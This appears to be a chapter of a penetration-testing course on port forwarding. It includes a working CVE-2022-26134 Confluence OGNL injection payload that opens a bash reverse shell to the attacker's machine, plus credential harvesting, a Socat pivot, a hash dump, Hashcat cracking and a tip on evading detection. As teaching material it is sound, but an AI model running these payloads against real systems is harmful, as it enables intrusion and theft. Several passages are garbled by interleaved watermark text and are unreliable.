@@ -1,0 +1,2582 @@
+                                                                          Penetration Testing with Kali Linux
+
+19 Port Redirection and SSH Tunneling
+
+In this Learning Module, we will cover the following Learning Units:
+� Port Forwarding on *NIX and Windows Machines
+� SSH Tunneling on (and between) *NIX and Windows Machines
+
+19.1 Why port redirection and tunneling?
+
+This Learning Unit covers the following Learning Objectives:
+
+� Understand the difference between common network layouts
+
+� Consider the impact of common network security devices
+� Understand when to use port redirection and tunneling techniques
+
+Most network environments are not -and should not be- flat, In a flat network, all devices are able
+to communicate freely with each other. There is little (or no) attempt to limit the access that each
+device has to other devices on the same network, regardless of whether devices need to
+communicate during normal operations.
+
+Flat network topology is generally considered poor security practice. Once an attacker has access
+to a single host, they can start communicating with every other host. From there, it will be much
+easier to spread through the network and start compromising other hosts.
+tAcsAtbtshhhumoeseeambcnyatpanntolrawuleehoerrsttaelitrswslevlonsodeatcfeehrenotkctaapdwhm.utleoorhspleyirponmrlkyoevsesiacmttt,dswirefeitiioshowacsuiercinhgkshpgenfustlnoeoearedfpwcagsohwbmninsnosheeoegfoti,nclOlwltoeuhSrtagoaat-hneiritf5esoikdfl7oyissc7cnttdn5tyahi2eenppnllr1vcoereto9ooiedcu0lic,sosegeaossnJhsasuegsosertfoeuyu,gfnfrb.tmrmrnNgoetthoeeyimheventsate.W,ttwntseEhaneodiasntettr.hcudwktlTehwboomsahnwosrecieksrugrkft.obrmtesnaayesepderentematthwcaooinectinfliiielorslnysctnnesroagetsnwtttreoowtaoavrnoesreintkvrrekweedawslriyy.liglallTloraicmoboltcshueeioetepssbnrisomrfadooftetpkrtodcvaeleeiecncomvketitiechhneoreientssnosrt,,
+
+One of the most common technologies used for this is Firewalls. Firewalls can be implemented at
+the endpoint software level. For example, the Linux kernel has firewall capabilities that can be
+configured with the iptables tool suite, while Windows offers the built-in Windows Defender
+Firewall. Firewalls may also be implemented as features within a piece of physical network
+infrastructure. Administrators may even place a standalone hardware firewall in the network,
+filtering all traffic.
+
+Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from
+traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from
+communicating with a port on a particularly privileged server. They can also block some hosts or
+subnets from accessing the wider internet.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  609
+                                                                                                                                        Penetration Testing with Kali Linux
+
+Most firewalls tend to allow or block traffic in line with a set of rules based on IP addresses and
+port numbers, so their functionality is limited. However, sometimes more fine-grained control is
+required. Deep Packet Inspection monitors the contents of incoming and outgoing traffic and
+terminates it based on a set of rules.
+
+Boundaries that are put in place by network administrators are designed to prevent the arbitrary
+movement of data into, out of, and across the network. But, as an attacker, these are exactly the
+boundaries we need to traverse. We'll need to develop strategies that can help us work around
+network restrictions as we find them.
+
+Port redirection (a term we are using to describe various types of port forwarding) and tunneling
+are both strategies we can use to traverse these boundaries. Port redirection modifies the data
+flow by redirecting packets from one socket to another. Tunneling means encapsulating one type
+of data stream within another, for example, transporting Hypertext Transfer Protocol (HTTP)
+traffic within a Secure Shell (SSH) connection (so from an external perspective, only the SSH
+traffic will be visible).
+
+In this Module, we will introduce port redirection and tunneling techniques through practical
+examples. We'll ease in by starting with the lowest complexity techniques, and increase
+complexity as we move step-by-step towards more hardened network environments. Each new
+technique will be applied to a new network configuration that is slightly different than the
+previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more
+advanced methods in a later Module.
+
+The logical topologies we create when chaining these strategies may initially be difficult to grasp.
+
+t1hWpoar9eevfcue.wi2lsliayilolllPubnnte.hodemerrtatsoktfoaionlnsgrdwrteeraqaafucfrihicrdetmdeincothogvneimqwinuaeinwtibhapeyusflLoattriheenaauttJhdemxevfaafftrnlyooecnwyionogWtlohsbftioettrlitanohfwieftiicanleliynxtina. tnBuyyititgvhieve.eeWnnendesothwfotouhrlidks  take the time
+                                                                                                                                                                                                                                                                          Module, we'll
+                                                                                                                                                                                                                                                                          with surgical
+
+This  LULeenaadrrennrisnwtgahnUednniwttochuoasvteeprposorttrhtfeoforfworOwSlalo-ra5dwr7dini7ning5g2gi1sLt9ee0acrhnniniqguOesbjectives:
+1.
+2.
+
+3. Use Socat to set up a port forward in Linux
+
+Port forwarding is the most fundamental technique we will examine in this Module. It's also a
+technique that's very commonly used in general-purpose networking. When port forwarding, we
+configure a host to listen on one port and relay all packets received on that port to another
+destination.
+
+In normal network conditions, a network administrator might create a port forward to allow
+access to a web server behind a firewall. In that case, they would configure the firewall to listen
+on a given port on one interface and pass all packets to the web server behind it.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                  610
+                                                                                                                              Penetration Testing with Kali Linux
+
+Many home routers also provide port forwarding functionality. These can be configured to listen
+on a port on the Internet-facing side of the router, then forward connections from that port to
+another device within the home network.
+
+How might we use port forwarding in an attack chain? In the next section, we'll consider a simple
+scenario.
+
+19.2.1 A simple port forwarding scenario
+
+Let's examine a port forwarding scenario. During an assessment, we find a Linux web server
+running a version of Confluence vulnerable to CVE-2022-26134: a pre-authentication remote code
+execution issue. We can exploit this vulnerability and gain a reverse shell from the server.
+
+During our enumeration, we find that this server has two network interfaces: one attached to the
+same network our Kali machine is also on (which allowed us to route to it directly), and another
+on an internal subnet. In the Confluence configuration file, we also find credentials and the IP
+address and port for a PostgreSQL database instance on a server in that internal subnet. We want
+to use these credentials to gain access to the database and enumerate further.
+
+The following diagram illustrates our current understanding of the network layout.
+
+                                                              Whitlow
+                                                    Jeffrey
+                              Figure O2S5-85: T7h7e52n1et9w0ork layout from our perspective so far
+
+One of the first things to notice about this diagram is that there are two named networks: the
+Wide Area Network (WAN) on the left and the Demilitarized Zone (DMZ) on the right.
+
+      Info
+     A DMZ is a network containing devices that may be more exposed to a wider, less
+     trusted network. A DMZ helps create a buffer zone between hosts on the wider, less
+     trusted network and internal hosts. In this scenario, the DMZ is the buffer network
+     segment between the WAN and whatever other internal networks we may find.
+
+Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ,
+and the Confluence server CONFLUENCE01 straddles both.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  611
+                                                                          Penetration Testing with Kali Linux
+
+A WAN is a network that is large and expansive. Some people refer to the public internet as the
+largest WAN in the world, and some larger organizations will refer to their large internal network
+as a WAN, or internal WAN. In this case, since we're simulating an attack from an external
+network, the WAN represents a large corporate internal network, or the internet itself.
+
+      Info
+     In this module's exercises, our Kali machine is positioned in the WAN. It can only route
+     directly to other hosts that are also on the WAN.
+
+CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on
+both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open
+socket" attached to the icon.
+
+PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our
+Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01
+also has an "open socket" attached to it, illustrating that there's something listening on TCP port
+5432 (this is likely a PostgreSQL server, since the default port is 5432).
+
+      Info
+     Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet
+     know if it's attached to any other networks. If later we find that PGDATABASE01 is
+     attached to other networks, we will expand our network diagram.
+
+With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL
+port on PGDATABASE01 from our Kali machine.
+
+BadApyotreetousaftvocnhcirrdeyeaibepneedgondgeitdntahsttiaioonnatfgfnhcatdaahirn.nneftodobPlsleomo-owurntosraFeeelodxordpntweeogatrafiareoditlnl,ilwncolegewhta'wwsateiilttsovhhenetgarSlupolwpcatJihacteohetefufstftrrheeeeeeclcaylhtfsbionoWclinhelqooinumowtvelfiifsronootwghwrntimssaeebeLccleneoti.atvoretnnors.in.YrgeTochuUreenscaieatt,neVaMsthgtaseroratsurctpeheepnorafVorVMvioiMdgwesrdeoa'usvropee
+1Ttho9e.gC2ao.in2nfalucecnecsesSwteoetCbtiOanNpgpFlLuicUpaEtiNtohCnOeSEt-0ol5a17g,7bew5t2eea1n9nr0veeeivrdeortsnoemlsehveeenlrlat. gAefttehredcisocmovmerainndg
+                                                                                                                                                                 execution vulnerability in
+                                                                                                                                                                 that the Confluence web
+
+application is vulnerable to CVE-2022-26134, we'll find a blog post from Rapid7 that includes a
+
+cURL command containing a proof-of-concept payload that claims to exploit the vulnerability and
+
+return a reverse shell.
+
+curl -v
+http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByNa
+me%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash
+%27%2C%27-c%27%2C%27bash%20-
+i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
+
+                                       Listing 562 - The example payload from the Rapid7 blog post.
+
+We don't run payloads without understanding exactly what they do, so we first need to figure out
+what's happening in this proof-of-concept.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                         612
+                                                                          Penetration Testing with Kali Linux
+
+The verbose (-v) curl request is being made to http://10.0.0.28:8090, which we assume is the
+blogpost author's vulnerable Confluence server. After this, the URL path looks more interesting.
+We observe that a lot of the characters in it are URL encoded, so we need to URL decode them to
+get a clearer sense of what the payload actually does.
+
+      Info
+     You can quickly URL decode strings by selecting Decode As... > URL in the Decoder tab in
+     Burp, or using an online tool such as CyberChef If working with sensitive information in a
+     real corporate environment, you should avoid pasting data into online tools. However, in
+     this case we're decoding a proof-of-concept that's already public, so we can use online
+     tools if necessary.
+
+After URL decoding the path, the function of the payload is clearer.
+
+/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new
+java.lang.ProcessBuilder().command('bash','-c','<cr>bash -i >& /dev/tcp/10.0.0.28/1270
+0>&1</cr>').start()")}/
+
+                                               Listing 563 - The example payload URL-decoded.
+
+The URL path is an OGNL injection payload. OGNL is Object-Graph Notation Language, an
+expression language commonly used in Java applications. OGNL injection can take place when
+an application handles user input in such a way that it gets passed to the OGNL expression
+parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be
+used to execute arbitrary code.
+
+The OGNL injection payload itself uses Java's ProcessBuilder class to spawn a Bash interactive
+
+reverse shell (bash -i).               atwlmoorsetapseornfse.ctFifrosWrth, oittuhlreonwCeoendfslu. eHnocwe esveerrv,ewr ethnaetetdhetopamyolodaifdy
+
+This proof-of-concept     payload is                                                                                                                                                            it
+before we can use it.     This is for                                                                                                                                                           is
+
+Bpmoaaisnchthinirnegevteiosr.sinWe teshhneeelolerdpigatioynlaomlapodadyiisflyopathodeinissteinnpgoatarawtmhpJeeeofrtreeftrro1seu2yinr70vthuoelnnepra1ay0bl.ol0ea.0dC.2ob8ne,fflowureehnicwchee  server is. Second, the
+                                                                                                                                                                                                is not where our Kali
+                                                                                                                                                                                                can reuse it to exploit
+
+Cp"W."aO,hy"Nil-loe"FaaLmdnUdasEtkN"r/iinC"n)ggEa0tirnh1eetanshnoeedt pmerernootcuodorfifdn-ioceafad-cst.OiohoASnen-ltlc5shl7e,to7opwu5tog2ei1uhs9arni0tlo'st'swocnnonomKeteapadllliewmtteaoalyycstahUtkiRhneeLe.tcehanesceoU,dRfeoLdr.etChnicesortedaxiinpnglocihitn,attrohaicsatcetcursornu(snntoo.tuaTtbhtleoy
+
+be important to the functioning of the payload. If any of these characters are encoded, the server
+
+will parse the URL differently, and the payload may not execute. This means we can't apply URL
+
+encoding across the whole payload once we've modified it.
+
+Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-
+concept payload as our base. We can change the Confluence server IP to 192.168.50.63, and the
+Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine
+(/dev/tcp/192.168.118.4/4444). We'll also remove the curl verbosity flag. This leaves us with the
+following modified payload:
+
+curl
+http://<cr>192.168.50.63</cr>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.
+getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.comm
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                        613
+                                                                                                   Penetration Testing with Kali Linux
+
+and%28%27bash%27%2C%27-c%27%2C%27bash%20-
+i%20%3E%26%20<cr>/dev/tcp/192.168.118.4/4444</cr>%200%3E%261%27%29.start%28%29%22%29%7
+D/
+
+                                                        Listing 564 - The modified payload.
+
+Now that our payload is customized for our use, we can start a Netcat listener on our Kali
+machine on TCP port 4444.
+
+kali@kali:~$ <cu>nc -nvlp 4444</cu>
+listening on [any] 4444 ...
+
+                                 Listing 565 - Starting Netcat listener on port 4444 on our Kali machine.
+
+With our listener running, we'll open another shell on our Kali machine, then run the curl command
+we just constructed.
+
+kali@kali:~$ <cu>curl
+http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
+ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
+bash%27%2C%27-c%27%2C%27bash%20-
+i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/</cu>
+
+kali@kali:~$
+
+              Listing 566 - Executing the modified reverse shell payload.
+
+The command itself doesn't return anything, but the reverse shell is caught by our listener.
+
+...
+
+listening on [any] 4444 ...
+
+connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
+
+bbciadaosnshfh::luncenoacnenjoo@cbtosncfoetnltuetroenrlcemi0i1nn:a/lthopipstr/ocsahtelessallssgrioaunp/c(on81f3l)ue:nWcIhient/alpboipwrno$pr<icuat>eidi<o/ccutl> for device
+<cr>uid=1L0is0t1in(gc5o6n7f-lBuaesnhcree)vergseids=he1l0l c0a1u(gchot nbfyloJuueerfnNfcerteec)yat
+                                                                                                   groups=1001(confluence)</cr>
+                                                                                                   listener, and confirmed with the id command.
+
+utWToshietoehruidhroaKucsaor lmqsi umhmietaelalcnlehidmsintciaeto.ebndlifsiprhmreivdsilteohgnaetOCstS.Oh-Ri5Nse7Fsg7Lh5aU2er1dlEl9lNei0ssCrsEu, 0nw1ne,inwngoewwcitahhnatvhbeeeagpirrnievvibleeargsseiecsseohnfeutlhml efercoroamntifoClunOe. NnWcFeeL'Ulul sEseNtraC.rTtEh0bi1ys
+
+checking network interfaces using ip addr.
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>ip addr</cu>
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen
+1000
+
+       link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+       inet 127.0.0.1/8 scope host lo
+
+            valid_lft forever preferred_lft forever
+       inet6 ::1/128 scope host
+
+            valid_lft forever preferred_lft forever
+2: <cr>ens192</cr>: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
+group default qlen 1000
+
+       link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                     614
+                                                                          Penetration Testing with Kali Linux
+
+       <cr>inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192</cr>
+            valid_lft forever preferred_lft forever
+
+       inet6 fe80::250:56ff:fe8a:5446/64 scope link
+            valid_lft forever preferred_lft forever
+
+3: <cr>ens224</cr>: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
+group default qlen 1000
+
+       link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
+       <cr>inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224</cr>
+
+            valid_lft forever preferred_lft forever
+       inet6 fe80::250:56ff:fe8a:c2c9/64 scope link
+
+            valid_lft forever preferred_lft forever
+                                    Listing 568 - Enumerating network interfaces on CONFLUENCE01.
+
+The output shows us that CONFLUENCE01 has two network interfaces: ens192 and ens224.
+ens192 has the IP address 192.168.50.63, and ens224 has the IP address 10.4.50.63. We can now
+verify the current routing table using the ip route command to understand how traffic is being
+directed.
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>ip route</cu>
+ip route
+default via 192.168.50.254 dev ens192 proto static
+10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63
+<cr>10.4.50.0/24 via 10.4.50.254 dev ens224 proto static</cr>
+<cr>192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63</cr>
+
+                                            Listing 569 - Enumerating routes on CONFLUENCE01.
+
+The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet
+through the ens192 interface, and hosts in the 10.4.50.0/24 subnet through the ens224 interface.
+
+<<//Cc<cvosvc?aoa<<niaxotn,rssmrfan/twee/lnlfianttul/aetuuutvaeuladippplenensiSTrpcnasgstyselsccipeise@iao-epoiccnvc>>oaan/oeoccnt=narunuo/fi"prsfmsoal1poitppun.lm-gloe0picduem"nleaeart<icntta/eeceipuoat<sa0nlmna/i/ec1tcots:oii-endonueo/drtan>tpionaetfuTpn-txailpygtdOto/upS=/aScdnete"at-oa,n>etUa5ntcplT/7af7e>Faclbuw5/s-oa2ecs8nes1oi"fn'e9lna?lcl0fn>uecl/e/rJeucncefeocdoifnnneenfdcf/nrfelcletui.uoyaecenlntsfnfWhcgclhleeoi.eut.x/ecclmbnafolicgtCwene.xod$.mcnw<ffllcg.iutu.Whe>xinnhcmc.alilete</rceuac>doinnfgigtuhreatcioonntenftisleusinagt
+
+   <buildNumber>8703</buildNumber>
+   <properties>
+...
+
+       <property
+name="hibernate.connection.password"><cr>D@t4basePassw0rd!</cr></property>
+
+       <property
+name="hibernate.connection.url"><cr>jdbc:postgresql://10.4.50.215:5432/confluence</cr>
+</property>
+
+       <property name="hibernate.connection.username"><cr>postgres</cr></property>
+...
+
+   </properties>
+</confluence-configuration>
+confluence@confluence01:/opt/atlassian/confluence/bin$
+
+                Listing 570 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  615
+                                                                                          Penetration Testing with Kali Linux
+
+We'll find the IP address of the database server, as well as the plain text username and password
+used to connect to it. We can use these credentials to authenticate to the database and continue
+our enumeration.
+
+We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it.
+Since we are running as the low-privileged confluence user, we are also unable to easily install
+software.
+
+We do have the PostgreSQL client psql installed on our Kali machine, but we can't connect directly
+to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.
+
+In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01,
+meaning that there is nothing stopping us from binding ports on the WAN interface of
+CONFLUENCE01 and connecting to them from our Kali machine.
+
+This is exactly the type of situation in which port forwarding can be useful. We can create a port
+forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets
+received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will
+use Socat to achieve this.
+
+We've verified the presence of the PostgreSQL service, located credentials, and confirmed our
+access limitations. Let's now use Socat to bypass those limitations.
+
+19.2.3 Port forwarding with Socat
+
+Now we are ready to create a port forward. We have an idea of how we want it to work:
+                                      otnhethientWernAWaNhl iistnulteobwrnfeatc.eTahnisd
+CONFLUENCE01 should listen on a port                                                      forward  all  packets received
+on this port to the PGDATABASE01 on                                                       concept  is   illustrated in the
+following diagram:
+                                      Jeffrey
+
+OS-57752190
+
+                                          Figure 259: The way we expect our port forward to work
+
+We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that
+port from our Kali machine. We want all the packets that we send to this port to be forwarded by
+CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward,
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                616
+                                                                                                                              Penetration Testing with Kali Linux
+
+connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP
+port 5432 on PGDATABASE01.
+
+As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-
+purpose networking tool that can set up a simple port forward in a single command.
+
+      Info
+     In this scenario, we find it already installed, but Socat does not tend to be installed by
+     default on *NIX systems. If not already installed, it's possible to download and run a
+     statically linked binary version instead.
+
+We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port
+on the WAN interface (that our Kali machine can connect to) and forward packets received on
+that port to PGDATABASE01.
+
+On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. It will listen on TCP port 2345
+(TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of
+dying after a single connection, then forward all traffic it receives to TCP port 5432 on
+PGDATABASE01 (TCP:10.4.50.215:5432).
+
+      Info
+     We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning
+     elevated privileges are not required.
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ <cu>socat -ddd TCP-
+LISTEN:2345,fork TCP:10.4.50.215:5432</cu>
+<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see
+
+222wHO20wpu000e22d22w22.n2s2o////dSn00e00S88s8L8////t(-Pt1111u88r8j8nhor1111j@e0e00c0ar::::cc111t1yh22p22.f:::t:o00os00r1r1o11gfstssusosoo.occecccaaaaomtittt[[)[n[444466t6655h558888e9999O]]]]pIIeIInTTsSsohSheiLictstksJTieeopntpfrorg(f2oolrdkdo,epiuuy1ctcttti,.Wohi6ini(tnnh)l"tccoltfl-wuopu>rd:de/ke5ss"/wtswswooof.f1totwwpaaerrneesswldr.eoivtertgl/oe)pnebdybTyitmhe
+22002222S//00im88W//p11al88ernpi11no00gr::t11f22o::r00w11arssdoosccaaliLttkis[[et44int66Ohg55Se588-s7995e1]]7-7aR5NIru2en1slen9itia0nassgrtytethniteoniSgndogecaatcoet cnpceotrApwttFfoi=tr2lhwoano<recpdtrcw>o0om.rmk0a.mn0d.o.0n:it2o3r4in5g</tcoro>ls.
+
+     Unusual listening ports (e.g., 2345) or outbound connections from a non-privileged
+     service user may raise red flags. In an engagement, consider ephemeral tools, covert
+     channels, or chaining techniques to evade detection.
+
+The network is now set up like the following diagram:
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  617
+                                                                          Penetration Testing with Kali Linux
+
+                        Figure 260: Socat in place as our port forwarder
+
+With the Socat process running, we can run psql on our Kali machine, specifying that we want to
+connect to CONFLUENCE01 (-h 192.168.50.63) on port 2345 (-p 2345) with the postgres user
+account (-U postgres). When prompted, we will enter the password, and once connected, we can
+run the \l command to list the available databases.
+
+kali@kali:~$ <cu>psql -h 192.168.50.63 -p 2345 -U postgres</cu>
+
+Password for user postgres:
+
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256,
+
+compression: off)            Whitlow
+Type "help" for help.
+
+postgres=# <cu>\l</cu>
+
+-<tp-t-oecemrm-sNp>t-paglcl-mra-aoe-ttnee-fes0-l1-ue-||+|n|||-c-pepp-Oooo-wsss|-nttt-egpgg-rrorr-eees-tsss-g|||||r|+e-EUsUU-nTTT-cFFF|-Oo888-SdU--iT-5nF-77g8-5-2||||||L+1i-9eee-s0nnnt-_|_C_-JoUUU-oelSeSSf-f..l.n-fUU_Uad-rTTTtUa-eeSFFF-ty.-a---U-b888T-a||F|s|||+e--seee-8nnn-___|-CUUU-tSSS-ey...n-pUUU_-eTTTU-FFFS-.-----U888T-|||F|||+--pp==-8oocc-ssA//-|ttcpp-ggcoo-<rress-/eestt-csssgg-r==rr->CCpee-TTrss-cci-//v-ppi-ool-sse-ttg-gge-rrs-ee-ss--++
+
+(4 rows)
+
+Listing 572 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port
+
+                             forward.
+
+Success! We've connected to the PostgreSQL database through our port forward. We'll also find
+that we have access to the confluence database.
+
+Using our new database access, we can continue our enumeration. In the confluence database,
+let's query the cwd_user table. This contains the username and password hashes for all
+Confluence users. We'll connect to the database with the \c confluence command, then run
+select * from cwd_user; to review everything in that table.
+
+postgres=# <cu>\c confluence</cu>
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.       618
+                                                                                       Penetration Testing with Kali Linux
+
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256,
+compression: off)
+You are now connected to database "confluence" as user "postgres".
+
+confluence=# <cu>select * from cwd_user;</cu>
+
+<cr> id | user_name | lower_user_name | active |                                       created_date           |
+
+updated_date       | first_name | lower_first_name | last_name | lower_last_name |
+
+display_name    | lower_display_name |                                    email_address                    |
+
+lower_email_address          |           external_id                                   | directory_id |
+
+credential
+
+---------+----------------+-----------------+--------+-------------------------+------
+
+-------------------+------------+------------------+---------------+-----------------
+
++------------------------+------------------------+-----------------------------------
+
+-+------------------------------------+--------------------------------------+--------
+
+------+---------------------------------------------------------------------------
+
+458753 | admin             | admin       |T                               | 2022-08-17 15:51:40.803 | 2022-
+
+08-17 15:51:40.803 | Alice      | alice                                   | Admin      | admin                              |
+
+Alice Admin           | alice admin                                       | alice@industries.internal                       |
+
+alice@industries.internal           | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |
+
+327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
+
+1212418 | trouble           | trouble    |T                               | 2022-08-18 10:31:48.422 | 2022-
+
+08-18 10:31:48.422 |            |                                         | Trouble    | trouble                            |
+
+Trouble               | trouble                                           | trouble@industries.internal                     |
+
+trouble@industries.internal         | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |
+
+327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
+
+1212419 | happiness         | happiness  |T                               | 2022-08-18 10:33:49.058 | 2022-
+
+08-18 10:33:49.058 |            |                                         | Happiness  | happiness                          |
+
+Happiness             | happiness                                         | happiness@industries.internal                   |
+
+03ha218-p7216p18i2814n11e07|s:s2@|{4Pi:Kdn3Cad4Sut.5sa4tbS2a2r9is}eeR|s_7/a.DAdianmBttMiaLnebgraN|nsale/ldFatZra|b7vadvs|eaUl_tbaCadb8P4fam2esine1Cu63p|d9d-pT6Wgfhi5ftr5lp-o|l4wd8dA|5Rd8m26-Ni0bJ2nf2q58A4-cc-0cZ89o82-uNa1qn88qtf+51Y|b0A2:aQ82da24Hm5:iE13an4u|.ak4/c2Hc9oTPu|n4t92022|-
+
+Hh3D3d02aa2Rr118-tt_24771Aa61a64a88128ddbb1aam417m129ssii8|3|e0nen:_@3|{A|a{i9dPnPd:rmmKKdh0idCuCir4ps_nnSS.t5_a5@5SadrSAi9i2m2cdncmi}ed}QsEniuo|iks.unMXitnHtrTnnRtiuk||meeKasr5nh.dBuaiia|r8|ncltIOhpatrCaSsd9rbde-_pamrqp5i_na0sG77|BneGaad5lB5dm2ht8mai1i||nIr5d9bcmn092iV34JfnWJ59K3eNcLa0fD1uccfacF00rLof6ueMau8|+|y1nz--TTUt77bXjb2g||N0aO28fdhm1--|aJrn44_QIt6c|Av|aza97dbqwd8e2HKma2m--G0iij0s9anzeg22n8dE@22_519aigo1d--dFLn00--mldj8fa8uiX6a1--nPsMea21@Btva708rbifeenUiedf12OeJ|d1f083uusee::.qats5543kdt4i2669UWmnrde::nkiitae00eesnz34UZrs||..W.3n35nXai29anlq5zCtzea||KrmVn022a00l2222|||--
+
+08-20 20:46:03.325 | RDP        | rdp                                     | Admin      | admin                              |
+
+RDP Admin             | rdp admin                                         | rdp_admin@industries.internal                   |
+
+rdp_admin@industries.internal       | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |
+
+327681 |
+
+{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34</cr>
+
+(6 rows)
+
+(END)
+
+                Listing 573 - The contents of the cwd_user table in the confluence database.
+
+We obtain multiple rows of user data. Each row contains data for a single Confluence user,
+including their password hash. We will use Hashcat to try to crack these.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                         619
+                                                                                                                               Penetration Testing with Kali Linux
+
+The Hashcat mode number for Atlassian (PBKDF2-HMAC-SHA1) hashes is 12001, so we can pass
+that to the -m mode flag. After copying the hashes into a file called hashes.txt, we'll pass this as
+the first positional argument. We can then pass the fastrack.txt password list that's built into Kali
+as the final positional argument.
+
+kali@kali:~$ <cu>hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt</cu>
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8 Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF,
+DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+======================================================================================
+===============================================
+* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB
+(1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+...
+
+<cr>{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd
+!</cr>
+<cr>{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass1
+23</cr>
+<cr>{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1
+234</cr>
+...
+
+              Listing 574 - Hashcat having cracked the database_admin, hr_admin and rdp_admin account hashes.
+
